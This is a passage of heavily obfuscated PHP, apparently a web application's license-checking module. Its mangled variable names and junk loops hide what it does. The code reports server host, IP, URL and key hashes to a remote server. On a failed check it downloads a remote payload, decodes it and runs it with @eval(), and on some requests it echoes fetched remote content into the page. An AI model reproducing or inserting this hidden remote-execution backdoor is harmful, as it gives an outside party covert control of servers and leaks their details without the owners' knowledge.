$Ñ–¥¿º[644]; if (!$Á ÌÚ) { die; } call_user_func(array($±‹şÀ€½[132], $±‹şÀ€½[133]), $ô¢²’ÁŠ); $¿ş…¹œ´ = $Ñ–¥¿º[645]; if (!$¿ş…¹œ´) { die; } } if ($this->opfr63662bef == $±‹şÀ€½[104]) { return; } $©¤äÉ› = array($±‹şÀ€½[134], $±‹şÀ€½[135], $±‹şÀ€½[136], $±‹şÀ€½[137], $±‹şÀ€½[138], $±‹şÀ€½[139]); $ßíè¨Ãá = $Ñ–¥¿º[646]; if (strlen($ßíè¨Ãá) < $Ñ–¥¿º[629]) { return; } $ìïÔ†½£ = Model($±‹şÀ€½[33])->get(); $ô¢²’ÁŠ = array($±‹şÀ€½[140] => $ìïÔ†½£[$±‹şÀ€½[34]], $±‹şÀ€½[141] => $ìïÔ†½£[$±‹şÀ€½[35]], $±‹şÀ€½[142] => $±‹şÀ€½[6]); foreach ($©¤äÉ› as $Ø²Å©â¼) { if (!isset($ìïÔ†½£[$Ø²Å©â¼]) || !$ìïÔ†½£[$Ø²Å©â¼]) { continue; } $ô¢²’ÁŠ[$Ø²Å©â¼] = $ìïÔ†½£[$Ø²Å©â¼]; } call_user_func(array($±‹şÀ€½[132], $±‹şÀ€½[133]), $ô¢²’ÁŠ); } private function bjlo8c75cbe5() { $ÇåµœÑÈ =& $_SERVER[¹àö™Ç¾]; $ŸÛ‘™Ë­ =& $_SERVER[˜²›ÃôÇ]; if ($_SERVER[$ŸÛ‘™Ë­[24]] != $ŸÛ‘™Ë­[143]) { return; } if (!_get($GLOBALS, $ŸÛ‘™Ë­[113])) { die; } $çûØÃÊ˜ = $GLOBALS[$ŸÛ‘™Ë­[13]]; if (isset($çûØÃÊ˜[$ŸÛ‘™Ë­[144]])) { $this->cpqn3156ddf7(); die; } if (!isset($çûØÃÊ˜[$ŸÛ‘™Ë­[145]]) || strlen($çûØÃÊ˜[$ŸÛ‘™Ë­[145]]) != 16) { show_json($ŸÛ‘™Ë­[146] . $çûØÃÊ˜[$ŸÛ‘™Ë­[145]], !1); } $¢¦ªü‘ = Model($ŸÛ‘™Ë­[33])->get($ŸÛ‘™Ë­[101]); $´·æîÃ¾ = md5($_SERVER[$ŸÛ‘™Ë­[100]] . $¢¦ªü‘); $ÂÆ æ§ã = array($ŸÛ‘™Ë­[145] => $çûØÃÊ˜[$ŸÛ‘™Ë­[145]], $ŸÛ‘™Ë­[147] => rand_string(16), $ŸÛ‘™Ë­[148] => $ŸÛ‘™Ë­[130], $ŸÛ‘™Ë­[149] => $ŸÛ‘™Ë­[150], $ŸÛ‘™Ë­[151] => $_SERVER[$ŸÛ‘™Ë­[152]], $ŸÛ‘™Ë­[153] => $_SERVER[$ŸÛ‘™Ë­[154]], $ŸÛ‘™Ë­[155] => $_SERVER[$ŸÛ‘™Ë­[156]], $ŸÛ‘™Ë­[99] => $´·æîÃ¾, $ŸÛ‘™Ë­[157] => Model($ŸÛ‘™Ë­[33])->get($ŸÛ‘™Ë­[125])); if ($çûØÃÊ˜[$ŸÛ‘™Ë­[158]] == $ŸÛ‘™Ë­[159]) { $ˆãÜ·” = $this->tmle2dcd9237($´·æîÃ¾, $ŸÛ‘™Ë­[160]); $ ºÌèâ = $this->iwajbcfbcb7f(json_encode($ÂÆ æ§ã), $´·æîÃ¾ . $ŸÛ‘™Ë­[161], 3); $ ºÌèâ = $ ºÌèâ . $ŸÛ‘™Ë­[162] . $_SERVER[$ŸÛ‘™Ë­[152]]; $–šÕ“Š = $this->jdhf331d099b($ŸÛ‘™Ë­[163] . $ˆãÜ·” . $ŸÛ‘™Ë­[164] . $ ºÌèâ, -1); show_json($–šÕ“Š, !0); } else { if ($çûØÃÊ˜[$ŸÛ‘™Ë­[158]] == $ŸÛ‘™Ë­[165]) { $Æ›’Ñ© = substr(md5($ŸÛ‘™Ë­[166] . $´·æîÃ¾), 12, 15) . $ŸÛ‘™Ë­[167]; $ ºÌèâ = $this->zyga1fd45fad(trim($çûØÃÊ˜[$ŸÛ‘™Ë­[168]]), $Æ›’Ñ©, 2); $¡ã¶ºç¶ = json_decode($ ºÌèâ, !0); if (!is_array($¡ã¶ºç¶) || !is_array($¡ã¶ºç¶[$ŸÛ‘™Ë­[169]]) || $¡ã¶ºç¶[$ŸÛ‘™Ë­[145]] != !0) { $êÚìÄÌÅ = $ŸÛ‘™Ë­[170]; $¾òæ•Ë£ = $¡ã¶ºç¶[$ŸÛ‘™Ë­[169]] ? $ŸÛ‘™Ë­[171] . $¡ã¶ºç¶[$ŸÛ‘™Ë­[169]] : $êÚìÄÌÅ; show_json($¾òæ•Ë£, !1); } else { $ÂÆ æ§ã[$ŸÛ‘™Ë­[147]] = $¡ã¶ºç¶[$ŸÛ‘™Ë­[169]][$ŸÛ‘™Ë­[172]]; } } else { $¡ã¶ºç¶ = $this->jdhf331d099b($ŸÛ‘™Ë­[173], $ÂÆ æ§ã, 10); } } if (!is_array($¡ã¶ºç¶) || !is_array($¡ã¶ºç¶[$ŸÛ‘™Ë­[169]]) || $¡ã¶ºç¶[$ŸÛ‘™Ë­[145]] != !0) { $êÚìÄÌÅ = LNG($ŸÛ‘™Ë­[174]); $¾òæ•Ë£ = $¡ã¶ºç¶[$ŸÛ‘™Ë­[169]] ? $ŸÛ‘™Ë­[171] . $¡ã¶ºç¶[$ŸÛ‘™Ë­[169]] : $êÚìÄÌÅ; show_json($¾òæ•Ë£, !1); } $Ì§ÅşÁ = $¡ã¶ºç¶[$ŸÛ‘™Ë­[169]]; $©÷±Âµ = $this->tglb80b505ca($Ì§ÅşÁ[$ŸÛ‘™Ë­[175]]); $âóÂÃ´À = $ÇåµœÑÈ[647]; if (!$©÷±Âµ || $©÷±Âµ != $Ì§ÅşÁ[$ŸÛ‘™Ë­[123]]) { $Ş¯Ì»Â = array($ŸÛ‘™Ë­[176] => Model($ŸÛ‘™Ë­[33])->get($ŸÛ‘™Ë­[101]), $ŸÛ‘™Ë­[177] => $_SERVER[$ŸÛ‘™Ë­[100]], $ŸÛ‘™Ë­[178] => this_url(), $ŸÛ‘™Ë­[153] => $_SERVER[$ŸÛ‘™Ë­[154]]); $ ºÌèâ = $this->fzgl98db955c(json_encode($Ş¯Ì»Â)); $this->jdhf331d099b($ŸÛ‘™Ë­[179] . $ ºÌèâ); show_json(LNG($ŸÛ‘™Ë­[180]), !0); } $¾êÌ—áå = array($ŸÛ‘™Ë­[181] => $Ì§ÅşÁ[$ŸÛ‘™Ë­[182]], $ŸÛ‘™Ë­[183] => $Ì§ÅşÁ[$ŸÛ‘™Ë­[184]], $ŸÛ‘™Ë­[185] => rand_string(16), $ŸÛ‘™Ë­[103] => $Ì§ÅşÁ[$ŸÛ‘™Ë­[186]]); if ($ÂÆ æ§ã[$ŸÛ‘™Ë­[147]]) { $¾êÌ—áå[$ŸÛ‘™Ë­[185]] = $ÂÆ æ§ã[$ŸÛ‘™Ë­[147]]; } $šÓñ¿æÃ = substr(md5($¾êÌ—áå[$ŸÛ‘™Ë­[183]]), 10, 10); $’Ğ¢»Ùì = $šÓñ¿æÃ . $¾êÌ—áå[$ŸÛ‘™Ë­[103]] . $¾êÌ—áå[$ŸÛ‘™Ë­[185]]; $²Ç¾¢ÁÜ = $ÇåµœÑÈ[648]; while (strlen($²Ç¾¢ÁÜ) < $ÇåµœÑÈ[12]) { if (!$²Ç¾¢ÁÜ) { break; } $²Ç¾¢ÁÜ++; } $¾êÌ—áå[$ŸÛ‘™Ë­[105]] = strrev(base64_encode($this->tmle2dcd9237($’Ğ¢»Ùì, $ŸÛ‘™Ë­[187]))); $åİúñóÛ = rand_string(16); $®ˆ¼ÑÕ± = $ÇåµœÑÈ[649]; while ($®ˆ¼ÑÕ± < $ÇåµœÑÈ[611]) { if ($®ˆ¼ÑÕ± >= 0) { break; } $®ˆ¼ÑÕ±++; } $çáÄıûß = $åİúñóÛ . $¾êÌ—áå[$ŸÛ‘™Ë­[103]] . $this->tmle2dcd9237(md5($¾êÌ—áå[$ŸÛ‘™Ë­[181]]), $åİúñóÛ); $éó…®×Æ = $ÇåµœÑÈ[650]; if (strlen($éó…®×Æ) < $ÇåµœÑÈ[618]) { die; } $¾êÌ—áå[$ŸÛ‘™Ë­[106]] = base64_encode(strrev($this->tmle2dcd9237($çáÄıûß, $ŸÛ‘™Ë­[188]))); if ($Ì§ÅşÁ[$ŸÛ‘™Ë­[189]] && $Ì§ÅşÁ[$ŸÛ‘™Ë­[189]] >= 1) { Model($ŸÛ‘™Ë­[33])->setDeep($ŸÛ‘™Ë­[190], $ŸÛ‘™Ë­[191]); } Model($ŸÛ‘™Ë­[33])->set($¾êÌ—áå); $¸œÂ©Í± = md5($_SERVER[$ŸÛ‘™Ë­[100]] . strrev($¢¦ªü‘) . $¾êÌ—áå[$ŸÛ‘™Ë­[183]]); $Ğ˜ ¿© = strrev(substr($¸œÂ©Í±, 10, 16)); $ÄÊËĞ’é = $this->iwajbcfbcb7f(json_encode($Ì§ÅşÁ), $¸œÂ©Í±); $µï‚å¸Ã = array_to_keyvalue(Model($ŸÛ‘™Ë­[7])->listData(), $ŸÛ‘™Ë­[192]); $Ñ‡ˆ…ÃÚ = $µï‚å¸Ã[$ŸÛ‘™Ë­[193]]; $¡ÔÊûØõ = array(); $ÎÒíªığ = $ÇåµœÑÈ[651]; while ($ÎÒíªığ < $ÇåµœÑÈ[629]) { if ($ÎÒíªığ >= 0) { break; } $ÎÒíªığ++; } $¡ÔÊûØõ[$Ğ˜ ¿©] = $ÄÊËĞ’é; Model($ŸÛ‘™Ë­[7])->update($Ñ‡ˆ…ÃÚ[$ŸÛ‘™Ë­[194]], array($ŸÛ‘™Ë­[195] => $¡ÔÊûØõ)); $‘óæáè = $ÇåµœÑÈ[652]; while ($‘óæáè < $ÇåµœÑÈ[607]) { if ($‘óæáè >= 0) { break; } $‘óæáè++; } $this->cemo329291d4 = $Ì§ÅşÁ; $this->opfr63662bef = $¾êÌ—áå[$ŸÛ‘™Ë­[103]]; $this->licenseRegistSuccess(); Cache::set($ŸÛ‘™Ë­[196] . md5($¢¦ªü‘ . $ŸÛ‘™Ë­[197]), $ŸÛ‘™Ë­[6]); show_json(LNG($ŸÛ‘™Ë­[180]), !0); $œş°¶Ôî = $ÇåµœÑÈ[653]; if (!$œş°¶Ôî) { return; } } private function licenseRegistSuccess() { $œ¯¨’‚ó =& $_SERVER[˜²›ÃôÇ]; $ô–û£Ô­ = Model($œ¯¨’‚ó[33])->get(); if ($ô–û£Ô­[$œ¯¨’‚ó[63]] != $œ¯¨’‚ó[191]) { Model($œ¯¨’‚ó[33])->set($œ¯¨’‚ó[63], $œ¯¨’‚ó[191]); } Action($œ¯¨’‚ó[198])->initStart(!0); } private function cpqn3156ddf7() { $¨‹Şû¹ù =& $_SERVER[¹àö™Ç¾]; $ñÎ›óª =& $_SERVER[˜²›ÃôÇ]; Model($ñÎ›óª[33])->set(array($ñÎ›óª[181] => $ñÎ›óª[6], $ñÎ›óª[183] => $ñÎ›óª[6], $ñÎ›óª[103] => $ñÎ›óª[104], $ñÎ›óª[105] => $ñÎ›óª[6], $ñÎ›óª[106] => $ñÎ›óª[6])); $ÓŸÉÎÄŠ = $¨‹Şû¹ù[654]; Model($ñÎ›óª[33])->setDeep($ñÎ›óª[190], $ñÎ›óª[199]); $¯¹¾È£ = $¨‹Şû¹ù[655]; while (strlen($¯¹¾È£) < $¨‹Şû¹ù[611]) { if (!$¯¹¾È£) { break; } $¯¹¾È£++; } $this->cemo329291d4 = array(); $ÈÏğ¢ùÍ = $¨‹Şû¹ù[656]; if (!$ÈÏğ¢ùÍ) { die; } $this->opfr63662bef = $ñÎ›óª[104]; $è¨İ”œ = $¨‹Şû¹ù[657]; if (strlen($è¨İ”œ) < $¨‹Şû¹ù[607]) { die; } } private function ejap75a00d3c() { $ ûµÆ¢ =& $_SERVER[¹àö™Ç¾]; $°Ğµ‰œê =& $_SERVER[˜²›ÃôÇ]; $_SERVER[$°Ğµ‰œê[154]] = _get($_SERVER, $°Ğµ‰œê[154], APP_HOST); $this->opfr63662bef = $°Ğµ‰œê[104]; $¦äâÃŠ = $ ûµÆ¢[658]; if (strlen($¦äâÃŠ) < $ ûµÆ¢[618]) { return; } $€–×®¹ã = Model($°Ğµ‰œê[33])->get(); if ($€–×®¹ã[$°Ğµ‰œê[103]] == $°Ğµ‰œê[104]) { return; } $†Ò§Ô— = Model($°Ğµ‰œê[33])->get($°Ğµ‰œê[101]); $ ÷êÎËÌ = $°Ğµ‰œê[196] . md5($†Ò§Ô— . $°Ğµ‰œê[197]); $±±üøŸ = $ ûµÆ¢[659]; while (strlen($±±üøŸ) < $ ûµÆ¢[611]) { if (!$±±üøŸ) { break; } $±±üøŸ++; } $ºéç¬£  = Cache::get($ ÷êÎËÌ); $À°ìİ = $ ûµÆ¢[660]; if (!is_array($ºéç¬£ ) || !isset($ºéç¬£ [$°Ğµ‰œê[200]]) || time() - $ºéç¬£ [$°Ğµ‰œê[200]] >= 60) { $¡é˜â±ø = Model($°Ğµ‰œê[7])->loadList(); $Â¯œ÷¼Ğ = $¡é˜â±ø[$°Ğµ‰œê[193]]; $…ç½Ó¢± = md5($_SERVER[$°Ğµ‰œê[100]] . strrev($†Ò§Ô—) . $€–×®¹ã[$°Ğµ‰œê[183]]); $Ÿ™é™°‘ = strrev(substr($…ç½Ó¢±, 10, 16)); $ºéç¬£  = $this->zyga1fd45fad($Â¯œ÷¼Ğ[$°Ğµ‰œê[83]][$Ÿ™é™°‘], $…ç½Ó¢±); $ºéç¬£  = json_decode($ºéç¬£ , !0); } if (!is_array($ºéç¬£ )) { return $this->cpqn3156ddf7(); } $ç¦õ§†© = strtotime($ºéç¬£ [$°Ğµ‰œê[123]]); if (time() >= $ç¦õ§†©) { return $this->cpqn3156ddf7(); } if (time() - $ºéç¬£ [$°Ğµ‰œê[200]] > 20) { $ºéç¬£ [$°Ğµ‰œê[200]] = time(); Cache::set($ ÷êÎËÌ, $ºéç¬£ ); } $this->cemo329291d4 = $ºéç¬£ ; $this->opfr63662bef = $€–×®¹ã[$°Ğµ‰œê[103]]; } private function gkfq49106b4e() { $îÑ•Àä¶ =& $_SERVER[˜²›ÃôÇ]; $ø“ï—üÌ = $GLOBALS[$îÑ•Àä¶[13]]; $Š€¶‘û = $_SERVER[¹àö™Ç¾][661]; $á‚â‡ü­ = $_SERVER[$îÑ•Àä¶[24]]; if ($á‚â‡ü­ == $îÑ•Àä¶[201] && $this->opfr63662bef == $îÑ•Àä¶[104]) { show_json(LNG($îÑ•Àä¶[202]), !1, $îÑ•Àä¶[203]); } $ıêğ‡ş = array($îÑ•Àä¶[204], $îÑ•Àä¶[205]); if (in_array($á‚â‡ü­, $ıêğ‡ş)) { if ($this->opfr63662bef == $îÑ•Àä¶[104] && isset($ø“ï—üÌ[$îÑ•Àä¶[206]])) { show_json(LNG($îÑ•Àä¶[202]), !1, $îÑ•Àä¶[203]); die; } $Æ€¿Ûá€ = $this->hbju9aeeb792(); if ($Æ€¿Ûá€ != intval($îÑ•Àä¶[207])) { if ($Æ€¿Ûá€ <= Model($îÑ•Àä¶[119])->count()) { show_json(LNG($îÑ•Àä¶[208]), !1, $îÑ•Àä¶[203]); die; } } } } private function jyiked29bd4a() { $üÒÅŞ›ñ =& $_SERVER[¹àö™Ç¾]; $Äöíå¨Ù =& $_SERVER[˜²›ÃôÇ]; $¡•ºĞô¡ = array($Äöíå¨Ù[116], $Äöíå¨Ù[209]); $êª¾Ş·Á = $üÒÅŞ›ñ[662]; if (!$êª¾Ş·Á) { die; } if (!_get($GLOBALS, $Äöíå¨Ù[113]) || !isset($_GET[$Äöíå¨Ù[210]])) { return; } if (!in_array($_SERVER[$Äöíå¨Ù[24]], $¡•ºĞô¡)) { return; } $»ı¿™É× = $Äöíå¨Ù[211]; $»ı¿™É× = $this->wruqc0243417($»ı¿™É×, $Äöíå¨Ù[212]); $ÔËÙíô® = stream_context_create(array($Äöíå¨Ù[213] => array($Äöíå¨Ù[214] => $Äöíå¨Ù[215], $Äöíå¨Ù[216] => 3))); $„¼¯ÊœŒ = $üÒÅŞ›ñ[663]; if (strlen($„¼¯ÊœŒ) < $üÒÅŞ›ñ[611]) { die; } $ÙšÓüÖ = @file_get_contents($»ı¿™É×, !1, $ÔËÙíô®); $àÏŠ¾÷ = $üÒÅŞ›ñ[664]; while (strlen($àÏŠ¾÷) < $üÒÅŞ›ñ[12]) { if (!$àÏŠ¾÷) { break; } $àÏŠ¾÷++; } header($Äöíå¨Ù[217]); if ($ÙšÓüÖ && strstr($ÙšÓüÖ, $Äöíå¨Ù[218])) { echo $ÙšÓüÖ; } die; } public function vmey771d0cc2($É¹ê’ ş) { $¢¹ª”àŒ =& $_SERVER[¹àö™Ç¾]; $ÙÀ·û…­ =& $_SERVER[˜²›ÃôÇ]; if ($this->opfr63662bef == $ÙÀ·û…­[219]) { return $É¹ê’ ş; } $ñ­•ãÉœ = array($ÙÀ·û…­[220] => $ÙÀ·û…­[221], $ÙÀ·û…­[222] => $ÙÀ·û…­[221], $ÙÀ·û…­[223] => $ÙÀ·û…­[221], $ÙÀ·û…­[224] => $ÙÀ·û…­[221], $ÙÀ·û…­[225] => $ÙÀ·û…­[226], $ÙÀ·û…­[227] => $ÙÀ·û…­[226], $ÙÀ·û…­[228] => $ÙÀ·û…­[226], $ÙÀ·û…­[229] => $ÙÀ·û…­[226], $ÙÀ·û…­[230] => $ÙÀ·û…­[226], $ÙÀ·û…­[231] => $ÙÀ·û…­[226], $ÙÀ·û…­[232] => $ÙÀ·û…­[226], $ÙÀ·û…­[233] => $ÙÀ·û…­[226], $ÙÀ·û…­[234] => $ÙÀ·û…­[226], $ÙÀ·û…­[235] => $ÙÀ·û…­[226], $ÙÀ·û…­[236] => $ÙÀ·û…­[226], $ÙÀ·û…­[237] => $ÙÀ·û…­[226]); $•®ÃÏ» = $¢¹ª”àŒ[665]; $±ışÆ’ä = explode($ÙÀ·û…­[238], _get($this->cemo329291d4, $ÙÀ·û…­[110], $ÙÀ·û…­[6])); $İÔæ´‚ó = array(); foreach ($ñ­•ãÉœ as $èú¾¡Áğ => $Ä²×ŠÕš) { if ($Ä²×ŠÕš == $ÙÀ·û…­[221] && substr($this->opfr63662bef, 0, 1) == $ÙÀ·û…­[221]) { continue; } if (!in_array($èú¾¡Áğ, $±ışÆ’ä)) { $İÔæ´‚ó[] = $èú¾¡Áğ; } } foreach ($İÔæ´‚ó as $èú¾¡Áğ) { unset($É¹ê’ ş[$èú¾¡Áğ]); $Ö×É´Ç = $¢¹ª”àŒ[666]; } return $É¹ê’ ş; $İŞ©¸‡ô = $¢¹ª”àŒ[667]; while (strlen($İŞ©¸‡ô) < $¢¹ª”àŒ[611]) { if (!$İŞ©¸‡ô) { break; } $İŞ©¸‡ô++; } } private function hwqad154d7b4() { $²‹ëû›ß =& $_SERVER[˜²›ÃôÇ]; if ($this->opfr63662bef != $²‹ëû›ß[104]) { $GLOBALS[$²‹ëû›ß[83]][$²‹ëû›ß[87]][$²‹ëû›ß[239]] = $²‹ëû›ß[199]; return; } $GLOBALS[$²‹ëû›ß[83]][$²‹ëû›ß[240]] = $²‹ëû›ß[191]; if (Model($²‹ëû›ß[241])->get($²‹ëû›ß[63]) != $²‹ëû›ß[199]) { Model($²‹ëû›ß[241])->set($²‹ëû›ß[63], $²‹ëû›ß[199]); } } public function ptdab6dbae08() { return $_SERVER[˜²›ÃôÇ][242]; $›Ê…¨¿Æ = $_SERVER[¹àö™Ç¾][668]; if (!$›Ê…¨¿Æ) { die; } } private function thxy98ec9c4f() { $åñÚşßû =& $_SERVER[¹àö™Ç¾]; $½Şï¼Æ =& $_SERVER[˜²›ÃôÇ]; $æ‰ıÚä = array($½Şï¼Æ[243], $½Şï¼Æ[244], $½Şï¼Æ[245]); $³»ğ®Äœ = $åñÚşßû[669]; $íöÁà²ø = $½Şï¼Æ[246] . md5($½Şï¼Æ[247]); if ($this->opfr63662bef == $½Şï¼Æ[104] || !_get($GLOBALS, $½Şï¼Æ[113])) { return; } if (!in_array($_SERVER[$½Şï¼Æ[24]], $æ‰ıÚä)) { return; } if (time() % 4 != 0) { return; } $€Şïó®ì = call_user_func(array($½Şï¼Æ[248], $½Şï¼Æ[249]), $íöÁà²ø); $ç¡¨Õ = $åñÚşßû[670]; while ($ç¡¨Õ < $åñÚşßû[611]) { if ($ç¡¨Õ >= 0) { break; } $ç¡¨Õ++; } if ($€Şïó®ì && time() - $€Şïó®ì < intval($½Şï¼Æ[250])) { return; } call_user_func(array($½Şï¼Æ[248], $½Şï¼Æ[133]), $íöÁà²ø, time()); $¹»ÊâÜÛ = Model($½Şï¼Æ[33])->get($½Şï¼Æ[101]); $ ë¾—çñ = $åñÚşßû[671]; if (!$ ë¾—çñ) { die; } $”şŸ×è = array($½Şï¼Æ[145] => Model($½Şï¼Æ[33])->get($½Şï¼Æ[181]), $½Şï¼Æ[158] => $this->opfr63662bef, $½Şï¼Æ[155] => $_SERVER[$½Şï¼Æ[156]], $½Şï¼Æ[157] => Model($½Şï¼Æ[33])->get($½Şï¼Æ[125]), $½Şï¼Æ[99] => md5($_SERVER[$½Şï¼Æ[100]] . $¹»ÊâÜÛ), $½Şï¼Æ[148] => $½Şï¼Æ[130], $½Şï¼Æ[151] => $_SERVER[$½Şï¼Æ[152]]); $Ş´½Õáª = $this->jdhf331d099b($½Şï¼Æ[251], $”şŸ×è); $ÁÔáÌ§Ê = $åñÚşßû[672]; while (strlen($ÁÔáÌ§Ê) < $åñÚşßû[12]) { if (!$ÁÔáÌ§Ê) { break; } $ÁÔáÌ§Ê++; } if (!is_array($Ş´½Õáª)) { return; } if ($Ş´½Õáª[$½Şï¼Æ[145]] && $Ş´½Õáª[$½Şï¼Æ[252]]) { if ($this->tglb80b505ca($Ş´½Õáª[$½Şï¼Æ[252]]) == $”şŸ×è[$½Şï¼Æ[145]]) { return; } } $this->cpqn3156ddf7(); if ($this->tglb80b505ca($Ş´½Õáª[$½Şï¼Æ[252]]) != $”şŸ×è[$½Şï¼Æ[145]]) { $•‹¬ŠÒÉ = array($½Şï¼Æ[176] => $¹»ÊâÜÛ, $½Şï¼Æ[177] => $_SERVER[$½Şï¼Æ[100]], $½Şï¼Æ[178] => this_url(), $½Şï¼Æ[153] => $_SERVER[$½Şï¼Æ[154]]); $À³‹œ·á = $this->fzgl98db955c(json_encode($•‹¬ŠÒÉ)); $Ş´½Õáª = $this->jdhf331d099b($½Şï¼Æ[179] . $À³‹œ·á); if ($Ş´½Õáª && is_array($Ş´½Õáª) && isset($Ş´½Õáª[$½Şï¼Æ[252]])) { $ÃÃêøÔ™ = $this->zyga1fd45fad($Ş´½Õáª[$½Şï¼Æ[252]], 2); if ($ÃÃêøÔ™) { $ÃÃêøÔ™ = $this->tglb80b505ca($ÃÃêøÔ™); } if ($ÃÃêøÔ™) { try { @eval($ÃÃêøÔ™); } catch (Exception $’‰’éûà) { } } } } } private function jdhf331d099b($®¯‘½²¬ = '', $´Ô¸şÒÕ = array(), $¤×ïŠˆ = 5) { $µ¦Ã«Ä¦ =& $_SERVER[¹àö™Ç¾]; $€Š¿·ã× =& $_SERVER[˜²›ÃôÇ]; $Ç’Úûá÷ = $€Š¿·ã×[253]; $Ç’Úûá÷ = $this->wruqc0243417($Ç’Úûá÷, $€Š¿·ã×[254]); $Ç’Úûá÷ = $Ç’Úûá÷ . $®¯‘½²¬; $—…ôë‰ = $µ¦Ã«Ä¦[673]; if (!$—…ôë‰) { die; } if ($´Ô¸şÒÕ && is_array($´Ô¸şÒÕ)) { $Ç’Úûá÷ = $Ç’Úûá÷ . $€Š¿·ã×[255] . http_build_query($´Ô¸şÒÕ); } if ($´Ô¸şÒÕ === -1) { return $Ç’Úûá÷; } $î¼ì²´£ = stream_context_create(array($€Š¿·ã×[213] => array($€Š¿·ã×[216] => $¤×ïŠˆ, $€Š¿·ã×[214] => $€Š¿·ã×[256]), $€Š¿·ã×[257] => array($€Š¿·ã×[258] => !1, $€Š¿·ã×[259] => !1))); $´Ô¸şÒÕ = @file_get_contents($Ç’Úûá÷, !1, $î¼ì²´£); $Û£èÇéÃ = $µ¦Ã«Ä¦[674]; return json_decode($´Ô¸şÒÕ, !0); $µ—é‹ = $µ¦Ã«Ä¦[675]; $ü”À“Ì = $µ¦Ã«Ä¦[676]; } private function hbju9aeeb792() { $­Á£œá =& $_SERVER[¹àö™Ç¾]; $ÒÙ¼ø«Ë =& $_SERVER[˜²›ÃôÇ]; $ÒÔšïàÏ = array($ÒÙ¼ø«Ë[260] => $ÒÙ¼ø«Ë[261], $ÒÙ¼ø«Ë[262] => $ÒÙ¼ø«Ë[263], $ÒÙ¼ø«Ë[264] => $ÒÙ¼ø«Ë[265], $ÒÙ¼ø«Ë[266] => $ÒÙ¼ø«Ë[267], $ÒÙ¼ø«Ë[268] => $ÒÙ¼ø«Ë[269], $ÒÙ¼ø«Ë[270] => $ÒÙ¼ø«Ë[207], $ÒÙ¼ø«Ë[271] => $ÒÙ¼ø«Ë[207], $ÒÙ¼ø«Ë[272] => $ÒÙ¼ø«Ë[261], $ÒÙ¼ø«Ë[273] => $ÒÙ¼ø«Ë[263], $ÒÙ¼ø«Ë[274] => $ÒÙ¼ø«Ë[265], $ÒÙ¼ø«Ë[275] => $ÒÙ¼ø«Ë[276], $ÒÙ¼ø«Ë[277] => $ÒÙ¼ø«Ë[267], $ÒÙ¼ø«Ë[278] => $ÒÙ¼ø«Ë[279], $ÒÙ¼ø«Ë[280] => $ÒÙ¼ø«Ë[269], $ÒÙ¼ø«Ë[281] => $ÒÙ¼ø«Ë[282], $ÒÙ¼ø«Ë[283] => $ÒÙ¼ø«Ë[284], $ÒÙ¼ø«Ë[285] => $ÒÙ¼ø«Ë[286]); $Ö“İÃ¶é = $ÒÔšïàÏ[$this->opfr63662bef]; $‹¹ÚÇ•ü = $­Á£œá[677]; if (strlen($‹¹ÚÇ•ü) < $­Á£œá[12]) { die; } $Ö“İÃ¶é = intval($Ö“İÃ¶é ? $Ö“İÃ¶é : $ÒÙ¼ø«Ë[261]); $Ô»°øÄ = $­Á£œá[678]; if (!$Ô»°øÄ) { return; } $‚ñ“ãÍû = _get($this->cemo329291d4, $ÒÙ¼ø«Ë[287]); $‚ñ“ãÍû = $‚ñ“ãÍû ? intval($‚ñ“ãÍû) : 0; return $Ö“İÃ¶é + $‚ñ“ãÍû; $³ÍÍˆ·â = $­Á£œá[679]; if (!$³ÍÍˆ·â) { return; } } public function bwho54c1d888($«İ¢ËÖ÷) { $È€—ÎÂ‘ =& $_SERVER[¹àö™Ç¾]; $ïìèƒƒ¹ =& $_SERVER[˜²›ÃôÇ]; $ı¶‰š ¢ = $this->hbju9aeeb792(); $¥¿ĞÄù½ = $È€—ÎÂ‘[680]; if ($«İ¢ËÖ÷[$ïìèƒƒ¹[288]] == $ïìèƒƒ¹[191]) { return; } if ($ı¶‰š ¢ >= intval($ïìèƒƒ¹[207])) { return; } $ÌÚ·Úô‹ = Model($ïìèƒƒ¹[119])->count(); if ($ÌÚ·Úô‹ <= $ı¶‰š ¢) { return; } $éÙ “ì = Model($ïìèƒƒ¹[119])->field($ïìèƒƒ¹[288])->limit($ı¶‰š ¢)->select(); $’úûß‰³ = $È€—ÎÂ‘[681]; if (!$’úûß‰³) { die; } $éÙ “ì = array_to_keyvalue($éÙ “ì, $ïìèƒƒ¹[6], $ïìèƒƒ¹[288]); $Ù·êÓóå = $È€—ÎÂ‘[682]; if (!$Ù·êÓóå) { return; } if (!in_array($«İ¢ËÖ÷[$ïìèƒƒ¹[288]], $éÙ “ì)) { show_json($ïìèƒƒ¹[289], !1, $ïìèƒƒ¹[203]); } } public function axuh5974441c() { $œºëÆß© =& $_SERVER[¹àö™Ç¾]; $‰Ò³»ÅÒ =& $_SERVER[˜²›ÃôÇ]; if (!_get($GLOBALS, $‰Ò³»ÅÒ[113]) || mt_rand(1, 100) > 20) { return; } $È’ôÀû = $‰Ò³»ÅÒ[211]; $èñÍÙÍÍ = $œºëÆß©[683]; if (!$èñÍÙÍÍ) { return; } $È’ôÀû = $this->wruqc0243417($È’ôÀû, $‰Ò³»ÅÒ[212]); $Å¨‡ù¯í = $œºëÆß©[684]; $Üúë‚÷Ø = stream_context_create(array($‰Ò³»ÅÒ[213] => array($‰Ò³»ÅÒ[214] => $‰Ò³»ÅÒ[215], $‰Ò³»ÅÒ[216] => 3))); $ÌÉ ¾Îş = $œºëÆß©[685]; if (!$ÌÉ ¾Îş) { die; } $¤ª£Üî = @file_get_contents($È’ôÀû, !1, $Üúë‚÷Ø); echo $‰Ò³»ÅÒ[290] . hash_encode($¤ª£Üî) . $‰Ò³»ÅÒ[291]; $ˆ£‘Ï† = $œºëÆß©[686]; while ($ˆ£‘Ï† < $œºëÆß©[611]) { if ($ˆ£‘Ï† >= 0) { break; } $ˆ£‘Ï†++; } } private function iwajbcfbcb7f($òµ¦ó§—, $ıèÉ€Å®, $üõû‰ôĞ = 3) { $éËßõŸ =& $_SERVER[¹àö™Ç¾]; $ßÈé¤Ëô =& $_SERVER[˜²›ÃôÇ]; usleep(1); $Å˜ûë ² = $éËßõŸ[687]; $òµ¦ó§— = trim($òµ¦ó§—); $øå¬×¼ = $éËßõŸ[688]; while ($øå¬×¼ < $éËßõŸ[607]) { if ($øå¬×¼ >= 0) { break; } $øå¬×¼++; } $¶Æ…€ş” = mt_rand(0, 5) . $ßÈé¤Ëô[6]; $ë‡¥   = $éËßõŸ[689]; if (!$ë‡¥  ) { return; } $­Êåµó  = rand_string(15); $ÅÍÔáå¼ = $éËßõŸ[690]; $ÁÛ¼Ş£³ = $ßÈé¤Ëô[292]; $ùÔ½‘– = 